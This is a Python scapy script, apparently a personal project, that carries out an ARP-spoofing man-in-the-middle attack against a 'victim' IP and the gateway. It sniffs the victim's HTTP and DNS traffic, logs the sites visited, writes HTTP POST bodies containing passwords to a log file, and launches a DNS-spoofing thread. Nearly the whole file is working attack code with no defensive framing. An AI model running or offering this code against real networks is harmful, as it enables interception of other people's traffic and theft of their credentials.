import codecs
import threading

#import scapy.all as scapy
import scapy.all as scapy
from scapy.layers.dns import DNS, DNSQR
from scapy.sendrecv import sr1, srp1, sendp, srp, send
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import ARP, Ether
#from scapy.all import Ether, ARP, srp, send
#from scapy.all import DNS, DNSQR, IP, sr1, srp1, sendp, UDP
import argparse
import time
import os
import sys

import dns_spoof
import site_list_logger
import client_fetch_template

LOG_FILE = "log.txt"

# Function to get the MAC address of a device with a given IP address.
# ip: IP address of the device whose MAC address needs to be fetched.
def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    print(f"Test1 ---- ip addr:{ip}")
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
    print("Test2")
    if ans:
        return ans[0][1].src

# Function to perform ARP spoofing for a given target IP and host IP.
# target_ip: IP address of the target device.
# host_ip: IP address of the host device (usually the gateway).
# verbose: Flag to print log messages (default is True).
def spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing

    #send(arp_response, verbose=0, count=7, iter=0.2)
    send(arp_response, verbose=0, count=7, inter=0.2)


    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

# Function to restore the ARP tables of target and host devices to their original state.
# target_ip: IP address of the target device.
# host_ip: IP address of the host device (usually the gateway).
# verbose: Flag to print log messages (default is True).
def arp_restore(target_ip, host_ip, verbose=True):
    """
    Restdres the normal process of a regular network
    This is done by sending the original informations
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

# Function to process captured packets, log visited sites and extract passwords from HTTP POST requests.
# packet: The captured packet to be processed.
# target_ip: IP address of the target device.
def process_packet(packet):
    # tmp_packet = str(packet)
    # print(tmp_packet)

    print(packet['IP'].src, args.target, packet['IP'].dst)
    #print(packet.summary(), end='\n\n')

    #and site_list_logger.is_addr_in_sites(packet['IP'].dst, site_list_logger.sites) == -1
    print(f"---------------------------Got packet: {packet}")
    if packet['IP'].src == args.target and packet['IP'].dst == "162.255.167.70":
        gateway_mac = get_mac(args.host)
        packet['Ether'].dst = gateway_mac
        #packet.show()
        #response = srp1(packet, verbose=False)
        #response.show()
        sendp(packet, verbose=False)

    if packet['IP'].src == "162.255.167.70":
        packet['IP'].dst = args.target
        target_mac = get_mac(args.target)
        me_mac = get_mac('192.168.0.87')
        packet['Ether'].dst = target_mac
        packet['Ether'].src = me_mac
        sendp(packet, verbose=False)

    if packet['IP'].src == args.target:
        site_list_logger.log_sites(args.target, packet['IP'].dst)
    elif 'DNS' in packet:
        for ans in range(packet[DNS].ancount):
            if packet[DNS]['DNS Resource Record'][ans].type == 1:
                site_list_logger.log_sites(args.target, packet[DNS]['DNS Resource Record'][ans].rdata)
            elif packet[DNS]['DNS Resource Record'][ans].type == 28:
                site_list_logger.log_sites(args.target, packet[DNS]['DNS Resource Record'][ans].rdata)

    if 'Raw' in packet :
        if 'POST' in str(packet['Raw'].load):
            if 'password' in str(packet['Raw'].load):  # tmp_packet.find('POST') != -1 and tmp_packet.find('password') != -1:
                with open(LOG_FILE, 'a') as f:
                    try:
                        f.write(codecs.decode(packet['Raw'].load, encoding='utf-8', errors='ignore'))  # .decode('utf-8')
                    except Exception as e:
                        pass

        return codecs.decode(packet['Raw'].load, encoding='utf-8', errors='ignore')
    else:
        return ''

# Function to capture packets and call process_packet for each captured packet.
# target_ip: IP address of the target device.
def packet_capture(target_ip):
    # while True:
    # capture = scapy.sniff(filter=f"ip and src {target_ip}", count=5)
    # capture = scapy.sniff(filter=f"ip and dst {target_ip}", count=5)
    # capture.summary()

    try:
        capture = scapy.sniff(filter=f"(tcp port 80 or udp port 53 or tcp port 53) and host {target_ip}",
                              prn=process_packet,
                              store=0)
        print(f"Capture: {capture}")
        # scapy.sendp(capture)
        # scapy.sendp(capture)
        # capture.summary()
        # print()
    except IndexError as e:
        print(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP spoof script")
    parser.add_argument("target", help="Victim IP Address to ARP poison")
    parser.add_argument("host",
                        help="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="verbosity, default is True (simple message each second)")
    args = parser.parse_args()
    target, host, verbose = args.target, args.host, args.verbose

    # enable_ip_route()
    try:
        r_pkts = threading.Thread(target=packet_capture, args=(target,))
        # c_ftch = threading.Thread(target=client_fetch_template.connect_loop, args=())
        dns_spf = threading.Thread(target=dns_spoof.dns_spoof_main, args=(target,))
        r_pkts.start()
        # c_ftch.start()
        dns_spf.start()
        while True:
            # telling the `target` that we are the `host`
            spoof(target, host, verbose)
            # telling the `host` that we are the `target`
            spoof(host, target, verbose)
            # sleep for one second
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        arp_restore(target, host)
        arp_restore(host, target)
        r_pkts.join()
        # c_ftch.join()
        dns_spf.join()